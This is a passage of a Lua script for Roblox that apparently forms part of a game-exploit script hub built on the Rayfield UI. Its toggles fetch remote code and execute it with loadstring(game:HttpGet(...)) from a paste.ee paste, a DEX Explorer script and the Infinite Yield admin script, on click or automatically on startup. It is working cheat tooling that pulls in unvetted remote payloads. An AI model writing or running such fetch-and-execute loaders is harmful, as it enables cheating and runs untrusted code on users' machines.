	Callback = function()
		if rs_injected then
			return
		end
		rs_injected = true
		loadstring(game:HttpGet("https://paste.ee/r/hK1Q4D65"))()
	end,
})

local RSToggle = RSTab:CreateToggle({
	Name = "Load RS on Startup",
	CurrentValue = false,
	Flag = "LoadRSOnStartup", -- A flag is the identifier for the configuration file; make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(value) end,
})

Rayfield:LoadConfiguration()

if DexToggle.CurrentValue then
	dex_injected = true
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-DEX-Explorer-29920"))()
end

if IYToggle.CurrentValue then
	iy_injected = true
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end

if RSToggle.CurrentValue then
	rs_injected = true
	loadstring(game:HttpGet("https://paste.ee/r/hK1Q4D65"))()
end

task.spawn(function()
	while task.wait() do
		for i, v in pairs(looped_functions) do
			task.spawn(v)
		end
	end
end)
